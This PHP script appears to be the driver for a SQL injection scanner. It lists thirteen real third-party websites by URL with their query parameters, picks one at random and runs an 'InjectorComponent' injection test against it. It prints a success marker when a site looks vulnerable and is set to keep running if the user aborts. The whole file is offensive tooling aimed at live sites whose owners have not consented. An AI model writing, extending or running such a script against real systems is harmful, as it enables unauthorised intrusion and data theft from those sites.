<?php


ignore_user_abort(1); 
$mysql = new InjectorComponent();
$u[] = 'www.art-in-berlin.de/incbmeld.php?id=4867';
$u[] = 'portalboyaca.com/noticia.php?id=21833';
$u[] = 'www.jukejointfestival.com/day_schedule.php?event_date=2018-04-12';
$u[] = 'usameat.me/subPage.php?page_id=5&subpage_id=13';
$u[] = 'www.avenued.com/usa/photos/photos.php?view=image&ID=445&order_num=14&album_id=22';
$u[] = 'www.gambia.com/category.php?url=real-estate-property';
$u[] = 'dusfrydlant.cz/data/clanky/index.php?id_kategorie=2';
$u[] = 'wmedia.cameroon-info.net/mm/cin_watch_video.php?m_uid=10270269394B985FB8643A9';
$u[] = 'caerd-ro.com.br/noticias.php?id=713';
$u[] = 'a1cleaningcompany.com/post.php?pid=1';
$u[] = 'www.jergens.com.ph/product.php?id=5';
$u[] = 'www.vacationwired.com/specialoffer.php?id=1030';
$u[] = 'www.archiviodistatodipalermo.it/editoriale.php?id=346';



$rrr= mt_rand(0,sizeof($u)-1);




//$u = 'hdleecher.com/?s=fs';
//$test = $mysql->inj_test($u);
$mysql->log_enable=false;
$mysql->debug =false;
$mysql->debug_full_content=false; //ну прям ваще полный с выводом удаленной страницы.
$mysql->debug_proxy=false;



$test = $mysql->inj_test($u[$rrr]);
if($test !=false){
	echo '||URLURL|| ololo';
	
}
die;

///логирование
//print_r($_SERVER);
//print_r($mysql);